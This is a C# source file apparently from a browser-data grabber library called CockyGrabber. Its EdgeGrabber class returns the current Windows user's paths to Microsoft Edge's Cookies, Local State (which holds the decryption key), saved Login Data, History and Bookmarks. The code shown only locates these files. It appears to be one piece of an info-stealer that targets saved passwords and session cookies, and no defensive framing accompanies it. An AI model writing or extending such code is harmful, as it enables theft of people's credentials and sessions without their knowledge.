using System;

namespace CockyGrabber.Grabbers
{
    public class EdgeGrabber : BlinkGrabber
    {
        public override string CookiePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
            }
        }
        public override string LocalStatePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
            }
        }
        public override string LoginDataPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
            }
        }
        public override string HistoryPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History";
            }
        }
        public override string BookmarkPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks";
            }
        }
    }
}